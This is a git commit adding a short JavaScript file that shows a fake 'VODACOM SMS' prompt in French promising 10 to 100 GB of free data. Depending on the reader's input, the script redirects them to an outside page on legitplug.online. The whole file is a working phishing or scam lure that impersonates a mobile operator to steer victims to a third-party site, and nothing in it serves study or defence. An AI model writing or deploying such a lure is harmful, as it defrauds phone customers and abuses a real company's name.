62bdbc46a780aaa5bc5732618e8e299cb6537390
dataviewz <gloliousam2@gmail.com>
2025-09-21 01:16:22 -0700

    Create activation-vadacomdata.js

---
+++ activation-vadacomdata.js
@@ -0,0 +1,5 @@
+var password = 'DONNÉES GRATUITES'
+password=prompt('VODACOM SMS: Cher client, veuillez vérifier si votre carte SIM Vodacom est éligible pour recevoir de 10 Go à 100 Go de données, récompense des anciens clients, appuyez sur Données gratuites pour vérifier maintenant','DONNÉES GRATUITES');
+if (password != 'DONNÉES GRATUITES') {
+location.href='https://legitplug.online/vadacomdata.html';
+}
